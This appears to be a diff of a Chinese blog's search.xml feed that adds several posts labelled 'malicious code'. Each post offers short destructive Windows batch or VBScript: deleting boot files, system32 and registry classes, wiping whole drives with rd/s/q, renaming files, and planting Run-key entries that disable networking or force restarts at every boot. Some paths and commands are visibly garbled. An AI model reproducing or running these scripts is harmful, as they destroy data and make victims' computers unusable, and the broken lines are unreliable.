+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>使PC永久崩溃恶意代码</p>
+<a id="more"></a>
+
+<h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">attrib -r -s -h c:\autoexec.bat</span><br><span class="line">del c:\autoexec.bat</span><br><span class="line">attrib -r -s -h c:\boot.ini</span><br><span class="line">del c:\boot.ini</span><br><span class="line">attrib -r -s -h c:\ntldr</span><br><span class="line">del c:\ntldr</span><br><span class="line">attrib -r -s -h c:\win.ini</span><br><span class="line">del c:\win.ini</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【恶意代码】删除所有注册表</title>
+    <url>/2020/10/18/%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E6%B3%A8%E5%86%8C%E8%A1%A8/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>删除所有注册表恶意代码</p>
+<a id="more"></a>
+
+<h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">@ECHO OFF</span><br><span class="line">START reg delete HKCR/.exe</span><br><span class="line">START reg delete HKCR/.dll</span><br><span class="line">START reg delete HKCR/*</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【恶意代码】删除system32</title>
+    <url>/2020/10/18/%E5%88%A0%E9%99%A4system32/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>删除system32恶意代码</p>
+<a id="more"></a>
+
+<h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">del c:\WINDOWS\system32\*.*/q</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【恶意代码】开启CD蜂鸣器</title>
+    <url>/2020/10/18/%E5%BC%80%E5%90%AFCD%E8%9C%82%E9%B8%A3%E5%99%A8/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开启CD蜂鸣器恶意代码</p>
+<a id="more"></a>
+
+<h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Set oWMP = CreateObject(<span class="string">"WMPlayer.OCX.7"</span>)</span><br><span class="line">Set colCDROMs = oWMP.cdromCollection</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> colCDROMs.Current &gt;= 1 <span class="keyword">then</span></span><br><span class="line">For i = 0 to colCDROMs.Count -1</span><br><span class="line">colCDROMs.Item(i).Eject</span><br><span class="line">Next</span><br><span class="line">For i = 0 to colCDROMs.Count -1</span><br><span class="line">colCDROMs.Item(i).Eject</span><br><span class="line">Next</span><br><span class="line">End If</span><br><span class="line">wscript.sleep 100</span><br><span class="line">loop</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【恶意代码】更改文件后缀名</title>
+    <url>/2020/10/18/%E6%9B%B4%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>更改文件后缀名恶意代码</p>
+<a id="more"></a>
+
+<h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">REN *.DOC *.TXT</span><br><span class="line">BEN *.JPEG *.TXT</span><br><span class="line">BEN *.LNK *.TXT</span><br><span class="line">BEN *.AVI *.TXT</span><br><span class="line">BEN *.MPEG *.TXT</span><br><span class="line">BEN *.COM *.TXT</span><br><span class="line">BEN *.BAT *.TXT</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【恶意代码】格式化硬盘</title>
+    <url>/2020/10/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E7%A1%AC%E7%9B%98/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>格式化硬盘恶意代码</p>
+<a id="more"></a>
+
+<h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">rd/s/q D:\</span><br><span class="line">rd/s/q C:\</span><br><span class="line">rd/s/q E:\</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【恶意代码】永久禁用网络</title>
+    <url>/2020/10/18/%E6%B0%B8%E4%B9%85%E7%A6%81%E7%94%A8%E7%BD%91%E7%BB%9C/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>永久禁用网络恶意代码</p>
+<a id="more"></a>
+
+<h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> @<span class="built_in">echo</span> off&gt;c:windowswimn32.bat</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">break</span> off&gt;&gt;c:windowswimn32.bat</span><br><span class="line"><span class="built_in">echo</span> ipconfig/release_all&gt;&gt;c:windowswimn32.bat</span><br><span class="line"><span class="built_in">echo</span> end&gt;&gt;c:windowswimn32.bat</span><br><span class="line">reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v</span><br><span class="line">WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f</span><br><span class="line">reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v</span><br><span class="line">CONTROLexit /t reg_sz /d c:windowswimn32.bat /f</span><br><span class="line">PAUSE</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【恶意代码】一直按回车</title>
+    <url>/2020/10/18/%E4%B8%80%E7%9B%B4%E6%8C%89%E5%9B%9E%E8%BD%A6/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直按回车</p>
+<a id="more"></a>
+
+<h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Set wshShell = wscript.CreateObject(<span class="string">"WScript.Shell"</span>)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">wscript.sleep 100</span><br><span class="line">wshshell.sendkeys <span class="string">"~(enter)"</span></span><br><span class="line">loop</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【恶意代码】启动电脑后自动关机</title>
+    <url>/2020/10/18/%E5%90%AF%E5%8A%A8%E7%94%B5%E8%84%91%E5%90%8E%E8%87%AA%E5%8A%A8%E5%85%B3%E6%9C%BA/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>启动电脑后自动关机恶意代码</p>
+<a id="more"></a>
+
+<h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> @<span class="built_in">echo</span> off&gt;c:windowshartlell.bat</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">break</span> off&gt;&gt;c:windowshartlell.bat</span><br><span class="line"><span class="built_in">echo</span> shutdown -r -t 11 -f&gt;&gt;c:windowshartlell.bat</span><br><span class="line"><span class="built_in">echo</span> end&gt;&gt;c:windowshartlell.bat</span><br><span class="line">reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun</span><br><span class="line">/v startAPI /t reg_sz /d c:windowshartlell.bat /f</span><br><span class="line">reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun</span><br><span class="line">/v /t reg_sz /d c:windowshartlell.bat /f</span><br><span class="line">PAUSE</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
       </categories>
   </entry>
 </search>
